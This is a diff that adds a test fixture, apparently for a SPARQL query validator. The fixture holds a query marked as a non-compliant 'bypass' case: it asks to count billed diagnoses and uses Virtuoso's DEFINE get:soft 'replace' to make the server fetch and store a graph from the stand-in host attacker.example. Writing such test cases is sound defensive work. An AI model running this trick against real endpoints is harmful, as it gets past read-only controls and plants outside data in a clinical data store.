@@ -1,0 +1,11 @@
+# question: Count the billed diagnoses in the dataset published at http://attacker.example/data.ttl.
+# expected_compliant: false
+# expected_rules: not_read_only
+# origin: bypass
+# notes: The Virtuoso DEFINE get:soft makes the server download the FROM graph and store it.
+DEFINE get:soft "replace"
+PREFIX sphn: <https://biomedit.ch/rdf/sphn-schema/sphn#>
+
+SELECT (COUNT(?diagnosis) AS ?billed_diagnoses)
+FROM <http://attacker.example/data.ttl>
+WHERE { ?diagnosis a sphn:BilledDiagnosis . }
